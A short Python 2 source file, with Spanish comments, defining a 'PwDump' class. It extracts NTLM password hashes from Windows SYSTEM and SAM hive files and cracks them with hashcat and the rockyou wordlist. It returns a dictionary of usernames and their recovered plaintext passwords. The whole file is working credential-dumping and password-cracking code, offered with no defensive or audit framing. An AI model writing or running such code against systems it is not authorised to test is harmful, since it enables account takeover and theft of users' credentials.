import subprocess

import lib


class PwDump(object):

    def __init__(self):
        pass

    def main(self, system, sam):
        """


        :rtype : object
        :param system:
        :param sam:
        :return:
        """
        user_hash = lib.dump_file_hashes(system, sam)
        elementos = user_hash.items()
        final_pass = dict()

        for username, mihash in elementos:
            print username
            print mihash
            hash_file = open("hash.txt", 'w')
            hash_file.write(mihash + "\n")
            hash_file.close()
            subprocess.check_output(
                "./hashcat/hashcat-cli64.bin -m 1000 --rules=perfect.rule hash.txt rockyou.txt --outfile-format=2 --outfile=resultado.txt",
                shell=True)
            # Lectura del fichero creado
            f = open('resultado.txt', 'r+')
            for line in f.readlines():
                passwords = line.strip()
                if len(passwords) > 0:
                    final_pass[username] = passwords
            f.close()
            subprocess.check_output("rm resultado.txt", shell=True)
        # final pass returns dicctionary  that contains user -> password cracked
        return final_pass
